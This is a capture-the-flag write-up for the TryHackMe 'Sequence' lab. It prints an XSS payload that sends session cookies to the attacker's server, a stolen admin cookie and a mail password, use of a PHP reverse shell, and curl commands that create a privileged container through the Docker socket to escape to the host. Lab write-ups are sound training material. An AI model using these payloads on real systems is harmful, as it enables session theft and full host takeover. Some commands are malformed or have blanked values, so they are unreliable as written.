# TryHackMe-Sequence

Robert made some last-minute updates to the review.thm website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

An important information, please take notes

After the search process, I discovered the http://review.thm/contact.php can send a message to the mod I tried the Script XSS and it succeeded

<img width="1280" height="745" alt="image" src="https://github.com/user-attachments/assets/4f8b3c65-2e92-4611-a8d1-80bcf7e9a00a" />

Image <script> var img = new Image(); img.src = 'http://:4444/stealcookies?' + document.cookie; </script>
Then I started the http server

python3 -m http.server 4444

We have gained the cookies of the mod

$ python3 -m http.server 4444

^C

Copy the cookies value of the mod to our value and then reload the page

That's right, we can see the mod flag at the top of the page üëç

After that, we got the Mod page, I seemed to pay attention to the chat section with the Admin, after trying a lot of Payload XSS and it was not successful, but what I did not think about was that we could send the admin to the feedback link that we sent http://review.thm/contact.php

This is admin cookies 836k3hecvt40k2pml7b24mb11n
So we have flag2
In the third flag I took a lot of time but after I was completed I felt that I was complicated on a simple problem üòÑ
In http://review.thm/mail/dump.txt has provided us with some important things

<img width="556" height="358" alt="image" src="https://github.com/user-attachments/assets/d703df3d-a86a-41be-8a84-579ac50c88ad" />

First, this page has lacked finance.php, right?
I fixed lottery.php to finance.php

<img width="552" height="576" alt="image" src="https://github.com/user-attachments/assets/00ce95a6-fa74-4daa-8946-88da12065dc2" />

That's right and we also have a password from mail : S60u}f5j

I used Reverse Shell from here https://github.com/pentestmonkey/php-reverse-shell

After upload i went to http://review.thm/uploads/ but it was empty, maybe it was in an internal

<img width="679" height="353" alt="image" src="https://github.com/user-attachments/assets/9844e0b1-a8f2-41de-8692-81461434c666" />

I tried to do like now just fix lottery.php to uploads/php-reverse-shell.php And so I got reverse shell
We are in a docker container let‚Äôs start by upgrading to shell : python3 -c "import pty;pty.spawn('/bin/bash')"

Right here, I have spent a lot of time and even stayed up all night using resources from Google and ChatGPT. I am currently very weak in this area, so I may feel a bit lost and unclear from this point onward.
First, create a container for Docker and then you can access the file system here:

Get the available images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
"Image": "php:8.1-cli",
"Cmd": ["/bin/sh"],
"Tty": true,
"HostConfig": {
"Privileged": true,
"Binds": ["/:/host"]
}
}' http://localhost/containers/create

Save id from previous script

curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers//start

docker exec -it chroot /host /bin/bash

So we have the third flag üëç
